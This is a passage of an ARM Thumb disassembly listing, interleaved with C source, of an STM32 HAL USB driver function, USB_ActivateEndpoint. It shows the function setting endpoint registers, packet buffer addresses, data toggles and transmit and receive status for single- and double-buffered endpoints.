 8006108:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800610c:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8006110:	e004      	b.n	800611c <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8006112:	2301      	movs	r3, #1
 8006114:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8006118:	e000      	b.n	800611c <USB_ActivateEndpoint+0x7c>
      break;
 800611a:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 800611c:	687a      	ldr	r2, [r7, #4]
 800611e:	683b      	ldr	r3, [r7, #0]
 8006120:	781b      	ldrb	r3, [r3, #0]
 8006122:	009b      	lsls	r3, r3, #2
 8006124:	441a      	add	r2, r3
 8006126:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 800612a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800612e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006132:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006136:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800613a:	b29b      	uxth	r3, r3
 800613c:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 800613e:	687a      	ldr	r2, [r7, #4]
 8006140:	683b      	ldr	r3, [r7, #0]
 8006142:	781b      	ldrb	r3, [r3, #0]
 8006144:	009b      	lsls	r3, r3, #2
 8006146:	4413      	add	r3, r2
 8006148:	881b      	ldrh	r3, [r3, #0]
 800614a:	b29b      	uxth	r3, r3
 800614c:	b21b      	sxth	r3, r3
 800614e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006152:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006156:	b21a      	sxth	r2, r3
 8006158:	683b      	ldr	r3, [r7, #0]
 800615a:	781b      	ldrb	r3, [r3, #0]
 800615c:	b21b      	sxth	r3, r3
 800615e:	4313      	orrs	r3, r2
 8006160:	b21b      	sxth	r3, r3
 8006162:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8006166:	687a      	ldr	r2, [r7, #4]
 8006168:	683b      	ldr	r3, [r7, #0]
 800616a:	781b      	ldrb	r3, [r3, #0]
 800616c:	009b      	lsls	r3, r3, #2
 800616e:	441a      	add	r2, r3
 8006170:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8006174:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006178:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800617c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006180:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006184:	b29b      	uxth	r3, r3
 8006186:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8006188:	683b      	ldr	r3, [r7, #0]
 800618a:	7b1b      	ldrb	r3, [r3, #12]
 800618c:	2b00      	cmp	r3, #0
 800618e:	f040 8178 	bne.w	8006482 <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8006192:	683b      	ldr	r3, [r7, #0]
 8006194:	785b      	ldrb	r3, [r3, #1]
 8006196:	2b00      	cmp	r3, #0
 8006198:	f000 8084 	beq.w	80062a4 <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 800619c:	687b      	ldr	r3, [r7, #4]
 800619e:	61bb      	str	r3, [r7, #24]
 80061a0:	687b      	ldr	r3, [r7, #4]
 80061a2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80061a6:	b29b      	uxth	r3, r3
 80061a8:	461a      	mov	r2, r3
 80061aa:	69bb      	ldr	r3, [r7, #24]
 80061ac:	4413      	add	r3, r2
 80061ae:	61bb      	str	r3, [r7, #24]
 80061b0:	683b      	ldr	r3, [r7, #0]
 80061b2:	781b      	ldrb	r3, [r3, #0]
 80061b4:	00da      	lsls	r2, r3, #3
 80061b6:	69bb      	ldr	r3, [r7, #24]
 80061b8:	4413      	add	r3, r2
 80061ba:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80061be:	617b      	str	r3, [r7, #20]
 80061c0:	683b      	ldr	r3, [r7, #0]
 80061c2:	88db      	ldrh	r3, [r3, #6]
 80061c4:	085b      	lsrs	r3, r3, #1
 80061c6:	b29b      	uxth	r3, r3
 80061c8:	005b      	lsls	r3, r3, #1
 80061ca:	b29a      	uxth	r2, r3
 80061cc:	697b      	ldr	r3, [r7, #20]
 80061ce:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80061d0:	687a      	ldr	r2, [r7, #4]
 80061d2:	683b      	ldr	r3, [r7, #0]
 80061d4:	781b      	ldrb	r3, [r3, #0]
 80061d6:	009b      	lsls	r3, r3, #2
 80061d8:	4413      	add	r3, r2
 80061da:	881b      	ldrh	r3, [r3, #0]
 80061dc:	827b      	strh	r3, [r7, #18]
 80061de:	8a7b      	ldrh	r3, [r7, #18]
 80061e0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80061e4:	2b00      	cmp	r3, #0
 80061e6:	d01b      	beq.n	8006220 <USB_ActivateEndpoint+0x180>
 80061e8:	687a      	ldr	r2, [r7, #4]
 80061ea:	683b      	ldr	r3, [r7, #0]
 80061ec:	781b      	ldrb	r3, [r3, #0]
 80061ee:	009b      	lsls	r3, r3, #2
 80061f0:	4413      	add	r3, r2
 80061f2:	881b      	ldrh	r3, [r3, #0]
 80061f4:	b29b      	uxth	r3, r3
 80061f6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061fa:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061fe:	823b      	strh	r3, [r7, #16]
 8006200:	687a      	ldr	r2, [r7, #4]
 8006202:	683b      	ldr	r3, [r7, #0]
 8006204:	781b      	ldrb	r3, [r3, #0]
 8006206:	009b      	lsls	r3, r3, #2
 8006208:	441a      	add	r2, r3
 800620a:	8a3b      	ldrh	r3, [r7, #16]
 800620c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006210:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006214:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006218:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800621c:	b29b      	uxth	r3, r3
 800621e:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006220:	683b      	ldr	r3, [r7, #0]
 8006222:	78db      	ldrb	r3, [r3, #3]
 8006224:	2b01      	cmp	r3, #1
 8006226:	d020      	beq.n	800626a <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006228:	687a      	ldr	r2, [r7, #4]
 800622a:	683b      	ldr	r3, [r7, #0]
 800622c:	781b      	ldrb	r3, [r3, #0]
 800622e:	009b      	lsls	r3, r3, #2
 8006230:	4413      	add	r3, r2
 8006232:	881b      	ldrh	r3, [r3, #0]
 8006234:	b29b      	uxth	r3, r3
 8006236:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800623a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800623e:	81bb      	strh	r3, [r7, #12]
 8006240:	89bb      	ldrh	r3, [r7, #12]
 8006242:	f083 0320 	eor.w	r3, r3, #32
 8006246:	81bb      	strh	r3, [r7, #12]
 8006248:	687a      	ldr	r2, [r7, #4]
 800624a:	683b      	ldr	r3, [r7, #0]
 800624c:	781b      	ldrb	r3, [r3, #0]
 800624e:	009b      	lsls	r3, r3, #2
 8006250:	441a      	add	r2, r3
 8006252:	89bb      	ldrh	r3, [r7, #12]
 8006254:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006258:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800625c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006260:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006264:	b29b      	uxth	r3, r3
 8006266:	8013      	strh	r3, [r2, #0]
 8006268:	e2d5      	b.n	8006816 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800626a:	687a      	ldr	r2, [r7, #4]
 800626c:	683b      	ldr	r3, [r7, #0]
 800626e:	781b      	ldrb	r3, [r3, #0]
 8006270:	009b      	lsls	r3, r3, #2
 8006272:	4413      	add	r3, r2
 8006274:	881b      	ldrh	r3, [r3, #0]
 8006276:	b29b      	uxth	r3, r3
 8006278:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800627c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006280:	81fb      	strh	r3, [r7, #14]
 8006282:	687a      	ldr	r2, [r7, #4]
 8006284:	683b      	ldr	r3, [r7, #0]
 8006286:	781b      	ldrb	r3, [r3, #0]
 8006288:	009b      	lsls	r3, r3, #2
 800628a:	441a      	add	r2, r3
 800628c:	89fb      	ldrh	r3, [r7, #14]
 800628e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006292:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006296:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800629a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800629e:	b29b      	uxth	r3, r3
 80062a0:	8013      	strh	r3, [r2, #0]
 80062a2:	e2b8      	b.n	8006816 <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 80062a4:	687b      	ldr	r3, [r7, #4]
 80062a6:	633b      	str	r3, [r7, #48]	; 0x30
 80062a8:	687b      	ldr	r3, [r7, #4]
 80062aa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80062ae:	b29b      	uxth	r3, r3
 80062b0:	461a      	mov	r2, r3
 80062b2:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80062b4:	4413      	add	r3, r2
 80062b6:	633b      	str	r3, [r7, #48]	; 0x30
 80062b8:	683b      	ldr	r3, [r7, #0]
 80062ba:	781b      	ldrb	r3, [r3, #0]
 80062bc:	00da      	lsls	r2, r3, #3
 80062be:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80062c0:	4413      	add	r3, r2
 80062c2:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80062c6:	62fb      	str	r3, [r7, #44]	; 0x2c
 80062c8:	683b      	ldr	r3, [r7, #0]
 80062ca:	88db      	ldrh	r3, [r3, #6]
 80062cc:	085b      	lsrs	r3, r3, #1
 80062ce:	b29b      	uxth	r3, r3
 80062d0:	005b      	lsls	r3, r3, #1
 80062d2:	b29a      	uxth	r2, r3
 80062d4:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80062d6:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 80062d8:	687b      	ldr	r3, [r7, #4]
 80062da:	62bb      	str	r3, [r7, #40]	; 0x28
 80062dc:	687b      	ldr	r3, [r7, #4]
 80062de:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80062e2:	b29b      	uxth	r3, r3
 80062e4:	461a      	mov	r2, r3
 80062e6:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80062e8:	4413      	add	r3, r2
 80062ea:	62bb      	str	r3, [r7, #40]	; 0x28
 80062ec:	683b      	ldr	r3, [r7, #0]
 80062ee:	781b      	ldrb	r3, [r3, #0]
 80062f0:	00da      	lsls	r2, r3, #3
 80062f2:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80062f4:	4413      	add	r3, r2
 80062f6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80062fa:	627b      	str	r3, [r7, #36]	; 0x24
 80062fc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80062fe:	881b      	ldrh	r3, [r3, #0]
 8006300:	b29b      	uxth	r3, r3
 8006302:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006306:	b29a      	uxth	r2, r3
 8006308:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800630a:	801a      	strh	r2, [r3, #0]
 800630c:	683b      	ldr	r3, [r7, #0]
 800630e:	691b      	ldr	r3, [r3, #16]
 8006310:	2b3e      	cmp	r3, #62	; 0x3e
 8006312:	d91d      	bls.n	8006350 <USB_ActivateEndpoint+0x2b0>
 8006314:	683b      	ldr	r3, [r7, #0]
 8006316:	691b      	ldr	r3, [r3, #16]
 8006318:	095b      	lsrs	r3, r3, #5
 800631a:	66bb      	str	r3, [r7, #104]	; 0x68
 800631c:	683b      	ldr	r3, [r7, #0]
 800631e:	691b      	ldr	r3, [r3, #16]
 8006320:	f003 031f 	and.w	r3, r3, #31
 8006324:	2b00      	cmp	r3, #0
 8006326:	d102      	bne.n	800632e <USB_ActivateEndpoint+0x28e>
 8006328:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800632a:	3b01      	subs	r3, #1
 800632c:	66bb      	str	r3, [r7, #104]	; 0x68
 800632e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006330:	881b      	ldrh	r3, [r3, #0]
 8006332:	b29a      	uxth	r2, r3
 8006334:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006336:	b29b      	uxth	r3, r3
 8006338:	029b      	lsls	r3, r3, #10
 800633a:	b29b      	uxth	r3, r3
 800633c:	4313      	orrs	r3, r2
 800633e:	b29b      	uxth	r3, r3
 8006340:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006344:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006348:	b29a      	uxth	r2, r3
 800634a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800634c:	801a      	strh	r2, [r3, #0]
 800634e:	e026      	b.n	800639e <USB_ActivateEndpoint+0x2fe>
 8006350:	683b      	ldr	r3, [r7, #0]
 8006352:	691b      	ldr	r3, [r3, #16]
 8006354:	2b00      	cmp	r3, #0
 8006356:	d10a      	bne.n	800636e <USB_ActivateEndpoint+0x2ce>
 8006358:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800635a:	881b      	ldrh	r3, [r3, #0]
 800635c:	b29b      	uxth	r3, r3
 800635e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006362:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006366:	b29a      	uxth	r2, r3
 8006368:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800636a:	801a      	strh	r2, [r3, #0]
 800636c:	e017      	b.n	800639e <USB_ActivateEndpoint+0x2fe>
 800636e:	683b      	ldr	r3, [r7, #0]
 8006370:	691b      	ldr	r3, [r3, #16]
 8006372:	085b      	lsrs	r3, r3, #1
 8006374:	66bb      	str	r3, [r7, #104]	; 0x68
 8006376:	683b      	ldr	r3, [r7, #0]
 8006378:	691b      	ldr	r3, [r3, #16]
 800637a:	f003 0301 	and.w	r3, r3, #1
 800637e:	2b00      	cmp	r3, #0
 8006380:	d002      	beq.n	8006388 <USB_ActivateEndpoint+0x2e8>
 8006382:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006384:	3301      	adds	r3, #1
 8006386:	66bb      	str	r3, [r7, #104]	; 0x68
 8006388:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800638a:	881b      	ldrh	r3, [r3, #0]
 800638c:	b29a      	uxth	r2, r3
 800638e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006390:	b29b      	uxth	r3, r3
 8006392:	029b      	lsls	r3, r3, #10
 8006394:	b29b      	uxth	r3, r3
 8006396:	4313      	orrs	r3, r2
 8006398:	b29a      	uxth	r2, r3
 800639a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800639c:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800639e:	687a      	ldr	r2, [r7, #4]
 80063a0:	683b      	ldr	r3, [r7, #0]
 80063a2:	781b      	ldrb	r3, [r3, #0]
 80063a4:	009b      	lsls	r3, r3, #2
 80063a6:	4413      	add	r3, r2
 80063a8:	881b      	ldrh	r3, [r3, #0]
 80063aa:	847b      	strh	r3, [r7, #34]	; 0x22
 80063ac:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80063ae:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80063b2:	2b00      	cmp	r3, #0
 80063b4:	d01b      	beq.n	80063ee <USB_ActivateEndpoint+0x34e>
 80063b6:	687a      	ldr	r2, [r7, #4]
 80063b8:	683b      	ldr	r3, [r7, #0]
 80063ba:	781b      	ldrb	r3, [r3, #0]
 80063bc:	009b      	lsls	r3, r3, #2
 80063be:	4413      	add	r3, r2
 80063c0:	881b      	ldrh	r3, [r3, #0]
 80063c2:	b29b      	uxth	r3, r3
 80063c4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063c8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063cc:	843b      	strh	r3, [r7, #32]
 80063ce:	687a      	ldr	r2, [r7, #4]
 80063d0:	683b      	ldr	r3, [r7, #0]
 80063d2:	781b      	ldrb	r3, [r3, #0]
 80063d4:	009b      	lsls	r3, r3, #2
 80063d6:	441a      	add	r2, r3
 80063d8:	8c3b      	ldrh	r3, [r7, #32]
 80063da:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063de:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063e2:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80063e6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063ea:	b29b      	uxth	r3, r3
 80063ec:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 80063ee:	683b      	ldr	r3, [r7, #0]
 80063f0:	781b      	ldrb	r3, [r3, #0]
 80063f2:	2b00      	cmp	r3, #0
 80063f4:	d124      	bne.n	8006440 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80063f6:	687a      	ldr	r2, [r7, #4]
 80063f8:	683b      	ldr	r3, [r7, #0]
 80063fa:	781b      	ldrb	r3, [r3, #0]
 80063fc:	009b      	lsls	r3, r3, #2
 80063fe:	4413      	add	r3, r2
 8006400:	881b      	ldrh	r3, [r3, #0]
 8006402:	b29b      	uxth	r3, r3
 8006404:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006408:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800640c:	83bb      	strh	r3, [r7, #28]
 800640e:	8bbb      	ldrh	r3, [r7, #28]
 8006410:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006414:	83bb      	strh	r3, [r7, #28]
 8006416:	8bbb      	ldrh	r3, [r7, #28]
 8006418:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800641c:	83bb      	strh	r3, [r7, #28]
 800641e:	687a      	ldr	r2, [r7, #4]
 8006420:	683b      	ldr	r3, [r7, #0]
 8006422:	781b      	ldrb	r3, [r3, #0]
 8006424:	009b      	lsls	r3, r3, #2
 8006426:	441a      	add	r2, r3
 8006428:	8bbb      	ldrh	r3, [r7, #28]
 800642a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800642e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006432:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006436:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800643a:	b29b      	uxth	r3, r3
 800643c:	8013      	strh	r3, [r2, #0]
 800643e:	e1ea      	b.n	8006816 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 8006440:	687a      	ldr	r2, [r7, #4]
 8006442:	683b      	ldr	r3, [r7, #0]
 8006444:	781b      	ldrb	r3, [r3, #0]
 8006446:	009b      	lsls	r3, r3, #2
 8006448:	4413      	add	r3, r2
 800644a:	881b      	ldrh	r3, [r3, #0]
 800644c:	b29b      	uxth	r3, r3
 800644e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006452:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006456:	83fb      	strh	r3, [r7, #30]
 8006458:	8bfb      	ldrh	r3, [r7, #30]
 800645a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800645e:	83fb      	strh	r3, [r7, #30]
 8006460:	687a      	ldr	r2, [r7, #4]
 8006462:	683b      	ldr	r3, [r7, #0]
 8006464:	781b      	ldrb	r3, [r3, #0]
 8006466:	009b      	lsls	r3, r3, #2
 8006468:	441a      	add	r2, r3
 800646a:	8bfb      	ldrh	r3, [r7, #30]
 800646c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006470:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006474:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006478:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800647c:	b29b      	uxth	r3, r3
 800647e:	8013      	strh	r3, [r2, #0]
 8006480:	e1c9      	b.n	8006816 <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 8006482:	683b      	ldr	r3, [r7, #0]
 8006484:	78db      	ldrb	r3, [r3, #3]
 8006486:	2b02      	cmp	r3, #2
 8006488:	d11e      	bne.n	80064c8 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 800648a:	687a      	ldr	r2, [r7, #4]
 800648c:	683b      	ldr	r3, [r7, #0]
 800648e:	781b      	ldrb	r3, [r3, #0]
 8006490:	009b      	lsls	r3, r3, #2
 8006492:	4413      	add	r3, r2
 8006494:	881b      	ldrh	r3, [r3, #0]
 8006496:	b29b      	uxth	r3, r3
 8006498:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800649c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064a0:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80064a4:	687a      	ldr	r2, [r7, #4]
 80064a6:	683b      	ldr	r3, [r7, #0]
 80064a8:	781b      	ldrb	r3, [r3, #0]
 80064aa:	009b      	lsls	r3, r3, #2
 80064ac:	441a      	add	r2, r3
 80064ae:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80064b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064ba:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 80064be:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064c2:	b29b      	uxth	r3, r3
 80064c4:	8013      	strh	r3, [r2, #0]
 80064c6:	e01d      	b.n	8006504 <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 80064c8:	687a      	ldr	r2, [r7, #4]
 80064ca:	683b      	ldr	r3, [r7, #0]
 80064cc:	781b      	ldrb	r3, [r3, #0]
 80064ce:	009b      	lsls	r3, r3, #2
 80064d0:	4413      	add	r3, r2
 80064d2:	881b      	ldrh	r3, [r3, #0]
 80064d4:	b29b      	uxth	r3, r3
 80064d6:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80064da:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064de:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 80064e2:	687a      	ldr	r2, [r7, #4]
 80064e4:	683b      	ldr	r3, [r7, #0]
 80064e6:	781b      	ldrb	r3, [r3, #0]
 80064e8:	009b      	lsls	r3, r3, #2
 80064ea:	441a      	add	r2, r3
 80064ec:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 80064f0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064f4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064f8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064fc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006500:	b29b      	uxth	r3, r3
 8006502:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 8006504:	687b      	ldr	r3, [r7, #4]
 8006506:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006508:	687b      	ldr	r3, [r7, #4]
 800650a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800650e:	b29b      	uxth	r3, r3
 8006510:	461a      	mov	r2, r3
 8006512:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006514:	4413      	add	r3, r2
 8006516:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006518:	683b      	ldr	r3, [r7, #0]
 800651a:	781b      	ldrb	r3, [r3, #0]
 800651c:	00da      	lsls	r2, r3, #3
 800651e:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006520:	4413      	add	r3, r2
 8006522:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006526:	65bb      	str	r3, [r7, #88]	; 0x58
 8006528:	683b      	ldr	r3, [r7, #0]
 800652a:	891b      	ldrh	r3, [r3, #8]
 800652c:	085b      	lsrs	r3, r3, #1
 800652e:	b29b      	uxth	r3, r3
 8006530:	005b      	lsls	r3, r3, #1
 8006532:	b29a      	uxth	r2, r3
 8006534:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8006536:	801a      	strh	r2, [r3, #0]
 8006538:	687b      	ldr	r3, [r7, #4]
 800653a:	657b      	str	r3, [r7, #84]	; 0x54
 800653c:	687b      	ldr	r3, [r7, #4]
 800653e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006542:	b29b      	uxth	r3, r3
 8006544:	461a      	mov	r2, r3
 8006546:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006548:	4413      	add	r3, r2
 800654a:	657b      	str	r3, [r7, #84]	; 0x54
 800654c:	683b      	ldr	r3, [r7, #0]
 800654e:	781b      	ldrb	r3, [r3, #0]
 8006550:	00da      	lsls	r2, r3, #3
 8006552:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006554:	4413      	add	r3, r2
 8006556:	f203 4304 	addw	r3, r3, #1028	; 0x404
 800655a:	653b      	str	r3, [r7, #80]	; 0x50
 800655c:	683b      	ldr	r3, [r7, #0]
 800655e:	895b      	ldrh	r3, [r3, #10]
 8006560:	085b      	lsrs	r3, r3, #1
 8006562:	b29b      	uxth	r3, r3
 8006564:	005b      	lsls	r3, r3, #1
 8006566:	b29a      	uxth	r2, r3
 8006568:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800656a:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 800656c:	683b      	ldr	r3, [r7, #0]
 800656e:	785b      	ldrb	r3, [r3, #1]
 8006570:	2b00      	cmp	r3, #0
 8006572:	f040 8093 	bne.w	800669c <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006576:	687a      	ldr	r2, [r7, #4]
 8006578:	683b      	ldr	r3, [r7, #0]
 800657a:	781b      	ldrb	r3, [r3, #0]
 800657c:	009b      	lsls	r3, r3, #2
 800657e:	4413      	add	r3, r2
 8006580:	881b      	ldrh	r3, [r3, #0]
 8006582:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 8006586:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 800658a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800658e:	2b00      	cmp	r3, #0
 8006590:	d01b      	beq.n	80065ca <USB_ActivateEndpoint+0x52a>
 8006592:	687a      	ldr	r2, [r7, #4]
 8006594:	683b      	ldr	r3, [r7, #0]
 8006596:	781b      	ldrb	r3, [r3, #0]
 8006598:	009b      	lsls	r3, r3, #2
 800659a:	4413      	add	r3, r2
 800659c:	881b      	ldrh	r3, [r3, #0]
 800659e:	b29b      	uxth	r3, r3
 80065a0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065a4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065a8:	87fb      	strh	r3, [r7, #62]	; 0x3e
 80065aa:	687a      	ldr	r2, [r7, #4]
 80065ac:	683b      	ldr	r3, [r7, #0]
 80065ae:	781b      	ldrb	r3, [r3, #0]
 80065b0:	009b      	lsls	r3, r3, #2
 80065b2:	441a      	add	r2, r3
 80065b4:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 80065b6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065ba:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065be:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80065c2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065c6:	b29b      	uxth	r3, r3
 80065c8:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80065ca:	687a      	ldr	r2, [r7, #4]
 80065cc:	683b      	ldr	r3, [r7, #0]
